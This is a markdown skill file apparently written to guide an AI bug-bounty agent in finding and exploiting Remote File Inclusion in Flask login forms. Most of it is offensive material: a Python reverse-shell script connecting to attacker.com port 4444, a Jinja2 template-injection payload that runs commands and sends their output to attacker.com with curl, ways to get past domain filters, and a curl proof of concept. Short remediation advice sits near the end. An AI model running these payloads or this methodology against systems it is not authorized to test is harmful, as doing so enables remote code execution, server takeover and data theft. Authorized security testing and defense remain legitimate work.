# 📡 Flask Login Form – Remote File Inclusion (RFI) – AI Bug Bounty Skill

## Skill Name
`flask-rfi-login`

## Description
Comprehensive detection and exploitation of Remote File Inclusion vulnerabilities in Python Flask login forms. This skill analyses scenarios where user-supplied URLs are used to fetch external resources that are subsequently rendered, included, or executed by the server during authentication. In Flask, RFI typically manifests as a combination of SSRF (fetching remote content) and insecure handling of that content – such as passing it to `render_template_string()`, `eval()`, `exec()`, or other inclusion mechanisms. The skill covers both blind RFI (where the server pulls a remote resource but does not output it) and non‑blind RFI leading to information disclosure or remote code execution.

## Affected Components
- **`render_template_string()` with remote content**:  
  ```python
  import requests
  content = requests.get(request.args.get('template_url')).text
  return render_template_string(content)
  ```
- **Custom template loaders** that support remote URLs in `{% include remote_url %}` (e.g., using a `FileSystemLoader` that maps URL schemes, or a custom Jinja2 loader that fetches from URLs).
- **`eval()` / `exec()` on fetched content**:  
  If the server loads a remote file and then evaluates it as Python code (e.g., dynamic configuration files).
- **Login form theming/customisation**: parameters like `theme_url`, `style_url`, `help_url`, `remote_header`, `footer_url` that fetch remote HTML/CSS/JS and embed them unsafely.
- **OAuth2 / OpenID Connect configuration endpoints**: when the server fetches a remote `idp_metadata` URL and parses it without proper validation, sometimes including parts of the fetched content in the login page.
- **User avatar / profile picture**: if the server fetches an external image and attempts to “include” its bytes in a page, possibly leading to injection if the response is treated as a template.
- **Password reset / magic links** that contain a URL to a “reset page template” which the server fetches and renders.

## Detection Patterns (Static & Dynamic)
### 1. Direct Fetch-and-Render Patterns
- **Code heuristic**: `requests.get(user_url)` followed by `render_template_string(response.text)` or similar.
- **Dynamic test**: Supply a URL pointing to a resource containing a Jinja2 payload (e.g., `{{7*7}}`). If the result `49` appears, RFI with SSTI is confirmed.

### 2. Custom Jinja2 Loader Handling Remote URLs
- **Heuristic**: A custom loader that interprets the template name as a URL and fetches it (e.g., `TemplateLoader` that checks for `http://` or `https://`).
- **Dynamic test**: Inject a full URL as the `template` or `page` parameter; observe if the server fetches it (by DNS/HTTP callback) and renders its content.

### 3. Dynamic Code Execution via Fetched Remote File
- **Heuristic**: Code that does:
  ```python
  code = requests.get(config_url).text
  exec(code)
  ```
- **Dynamic test**: Provide a URL hosting a Python payload that writes to a file or calls back to an attacker server; check for execution evidence (e.g., callback or changed state).

### 4. Blind RFI via Out-of-Band Callbacks
- When the server fetches a URL but does not include the response in the visible page, it might still be used internally.
- **Dynamic test**: Supply a URL to a collaborator; if the server makes a request, RFI is present. Then attempt to escalate by pointing it to a URL that serves a malicious payload that could be executed if the server processes it.

### 5. Log Poisoning via Remote URL Parameter
- If the server logs the fetched URL, an attacker can inject payloads into log files and later include those log files via LFI to achieve RCE. The RFI here is the trigger to write the log.

## Testing Methodology (AI Agent Steps)
1. **Identify URL-Accepting Parameters**
   - Search for any login form parameter that appears to accept a URL: `template`, `remote_template`, `theme_url`, `style_url`, `header_url`, `footer_url`, `redirect_uri`, `callback_url`, `idp_url`, `config_url`, `help_url`, `doc_url`, `include`, etc.
   - Examine the login flow (GET/POST parameters) and page source for hidden fields.

2. **Confirm Outbound Fetch**
   - Insert a Burp Collaborator / webhook.site URL. If a request arrives, the server fetches remote resources.
   - Measure response timing differences when pointing to a live host vs. an unreachable host.

3. **Test for Template Inclusion (RCE)**
   - Host a file containing a simple SSTI probe: `{{ 7*7 }}` or `{{ config }}`.
   - Set the URL parameter to `http://your-server/evil.jinja2`. If the result `49` (or the Flask config) appears in the login response, SSTI via remote inclusion is confirmed.
   - Test with payloads that read files or execute commands:
     ```python
     {{ ''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['os'].popen('id').read() }}
     ```

4. **Test for Code Execution (Python)**
   - Host a Python script that performs a reverse connection: `import os; os.system('curl http://attacker.com/$(hostname)')`
   - If the application uses `exec()` on the fetched content, the payload will execute.
   - Use OOB detection to confirm execution.

5. **Bypass Filters and Restrictions**
   - If the server only allows `.html` extensions, name your remote file `evil.html` but include Jinja2 code; some servers might still process it as a template if the content type is text/html.
   - If the URL is validated to only certain domains, try URL redirection from an allowed domain to your attacker server.
   - If the server only fetches from `https://trusted.com`, look for open redirect on that trusted site.

6. **Chain RFI with Other Vulnerabilities**
   - RFI + LFI: If the server caches the remote file locally and the cache path is predictable, include the cached file via LFI to bypass network restrictions.
   - RFI + SSRF: Use the RFI endpoint as a proxy to attack internal services.

## Essential Payloads (Flask Login RFI)
### Hosted File with Jinja2 SSTI Probe
**File hosted on attacker server (e.g., `http://attacker.com/payload.html`):**
```html
{{7*7}}
```
If output `49` appears, SSTI is present.

**Full RCE payload:**
```python
{{ ''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['os'].popen('curl http://attacker.com/?c=$(id)').read() }}
```
(replace X with the index of `subprocess.Popen`)

### Hosted Python Code for `exec()` Injection
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

### URL-Based Payload (if directly included via `requests` + `render_template_string`)
```
http://attacker.com/ssti.html
```

### Blind RFI (Callback only)
- `http://attacker.com/` – just to trigger a request.

### Wrapping with Allowed Schemes
- If only HTTP allowed, host a redirect to `file:///etc/passwd` (but server must follow redirects and support file scheme – unlikely in `requests`, but possible in other libraries).

## Post-Exploitation
- **Remote Code Execution** via SSTI or `exec()`, leading to full server compromise.
- **Internal network scanning** by forcing the server to fetch resources from internal IPs.
- **Data exfiltration** by serving a payload that reads sensitive files and sends them to the attacker.

## Secure Coding Recommendations
- **Never fetch and render/execute user‑supplied URLs**. If a feature requires fetching remote content, whitelist allowed domains and validate the scheme (only `https`).
- **Disable dangerous functions** like `render_template_string()` with dynamic content. Use static templates with context variables.
- **Avoid `eval()`/`exec()`** entirely; if dynamic code execution is needed, sandbox it heavily.
- **Use a restrictive outbound firewall** to prevent connections to internal networks.
- **Validate and sanitise all input**: Reject any parameter that looks like a URL unless absolutely necessary.
- **Set appropriate timeouts** on any fetch operations to prevent DoS.

## Output Format (Bug Report)
```
Title: Remote File Inclusion Leading to Remote Code Execution in Login Form
Severity: Critical
Endpoint: POST /login
Vulnerable Parameter: template_url
Description:
  The login endpoint fetches a remote template from the `template_url` parameter and renders it with render_template_string() without sanitisation. An attacker can host a malicious Jinja2 template on a remote server and force the application to include it, resulting in arbitrary code execution on the server.
Proof of Concept:
  1. Host a file at http://attacker.com/evil.html containing {{config}}.
  2. Send POST request:
     curl -X POST https://target.com/login -d "template_url=http://attacker.com/evil.html&username=test&password=test"
  3. The response includes the Flask configuration dictionary.
Remediation:
  Remove the ability to fetch remote templates; use a static list of allowed templates. Never pass user-controlled URLs to render_template_string or exec.
```

## Skill Metadata
- **Author**: AI Bug Bounty Hunter
- **Version**: 1.0
- **Target Framework**: Flask (Python) with dynamic rendering or code execution features
- **Testing Type**: Black-box / Grey-box (requires attacker‑controlled HTTP server)
- **Dependencies**: None; AI can craft remote payloads and interpret fetch behaviour.